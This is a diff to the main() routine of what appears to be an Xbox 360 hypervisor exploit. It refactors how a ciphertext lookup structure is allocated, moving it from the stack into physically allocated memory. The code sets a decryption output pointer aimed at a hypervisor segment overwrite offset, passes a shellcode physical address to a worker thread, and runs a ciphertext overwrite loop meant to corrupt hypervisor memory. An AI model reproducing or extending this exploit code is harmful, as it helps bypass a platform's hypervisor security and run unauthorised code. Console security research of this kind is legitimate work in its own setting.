@@ -727,18 +727,6 @@ void __cdecl main()
     // Get the full physical address of the shell code buffer.
     ULONGLONG ShellCodePhys = 0x8000000000000000 | MmGetPhysicalAddress(pShellCodeData);
 
-    // Allocate some physical memory to store the cipher text we want to write.
-    BYTE* pCipherTextBuffer = (BYTE*)XPhysicalAlloc(0x3000, MAXULONG_PTR, 0x80, PAGE_READWRITE | PAGE_NOCACHE);
-    if (pCipherTextBuffer == NULL)
-    {
-        DbgPrint("Failed to allocate memory for cipher text\n");
-        DbgBreakPoint();
-        VdDisplayFatalError(0x12400 | ERR_CIPHER_TEXT_BUFFER_OOM);
-        return;
-    }
-
-    memset(pCipherTextBuffer, 0, 0x3000);
-
     // Allocate a 64k block of memory for the update data.
     BYTE* pUpdateData = (BYTE*)XPhysicalAlloc(UpdateDataSize, MAXULONG_PTR, 0x10000, PAGE_READWRITE | PAGE_NOCACHE | MEM_LARGE_PAGES);
     if (pUpdateData == NULL)
@@ -752,21 +740,28 @@ void __cdecl main()
     // Initialize update data.
     memset(pUpdateData, 0, UpdateDataSize);
 
+    // Allocate some physical memory to store the cipher text we want to write
+    CIPHER_TEXT_DATA* pCipherTextBuffer = (CIPHER_TEXT_DATA*)XPhysicalAlloc(sizeof (CIPHER_TEXT_DATA), MAXULONG_PTR, 0x10000, PAGE_READWRITE | MEM_LARGE_PAGES);
+    if (pCipherTextBuffer == NULL)
+    {
+        DbgPrint("Failed to allocate memory for cipher text\n");
+        DbgBreakPoint();
+        VdDisplayFatalError(0x12400 | ERR_CIPHER_TEXT_BUFFER_OOM);
+        return;
+    }
+    // Zero the above memory so that unused slots of the lookup table contain zeros.
+    memset(pCipherTextBuffer, 0, sizeof (CIPHER_TEXT_DATA));
+
     // Setup cipher text parameters.
-    // This structure needs to be on the stack so that
-    // the lookup table is hot in cache.
-    CIPHER_TEXT_DATA CipherTextData;
-    memset(&CipherTextData, 0, sizeof CipherTextData);
-    CipherTextData.dec_end_input_pos = 0xFFFFFFFFFFFFFFFF;
-    CipherTextData.dec_output_buffer = 0x8000010600030000 + (HV_SEG3_OVERWRITE_OFFSET - BLOCK_14_TARGET_OFFSET);
+    pCipherTextBuffer->dec_end_input_pos = 0xFFFFFFFFFFFFFFFF;
+    pCipherTextBuffer->dec_output_buffer = 0x8000010600030000 + (HV_SEG3_OVERWRITE_OFFSET - BLOCK_14_TARGET_OFFSET);
 
     // Get the size of the decompressed update data.
     DWORD updateDataDecompressedSize = *(DWORD*)(pCleanUpdateData + 0x1C);
 
     DWORD outputOffset = PAGE_ALIGN_64K(CACHE_LINE_SIZE + CACHE_ALIGN(CleanUpdateDataSize));
     DWORD scratchOffset = PAGE_ALIGN_64K(outputOffset + CACHE_ALIGN(updateDataDecompressedSize));
-    BuildCipherTextLookupTable(pUpdateData, UpdateDataSize, scratchOffset, &CipherTextData);
-
+    BuildCipherTextLookupTable(pUpdateData, UpdateDataSize, scratchOffset, pCipherTextBuffer);
 
     // Initialize update data.
     memset(pUpdateData, 0, UpdateDataSize);
@@ -828,7 +823,7 @@ void __cdecl main()
     ThreadArgs.ScratchDataOffset = pUpdateInfo->ScratchBufferOffset;
     ThreadArgs.ScratchDataSize = pUpdateInfo->ScratchBufferSize;
 
-    ThreadArgs.HvCheckAddress = CipherTextData.dec_output_buffer;
+    ThreadArgs.HvCheckAddress = pCipherTextBuffer->dec_output_buffer;
     ThreadArgs.ShellCodePhysAddress = ShellCodePhys;
 
     // Save the scratch pointer, we can't access pUpdateInfo from here on out because it'll be moved to protected memory by the hv.
@@ -851,7 +846,7 @@ void __cdecl main()
     ResumeThread(hXKEWorkerThread);
 
     // Run ciphertext overwrite loop on HW thread 0.
-    CiphertextOverwriteLoop(pScratchPtr, &CipherTextData);
+    CiphertextOverwriteLoop(pScratchPtr, pCipherTextBuffer);
 
     // Should never make it here.
     DbgBreakPoint();
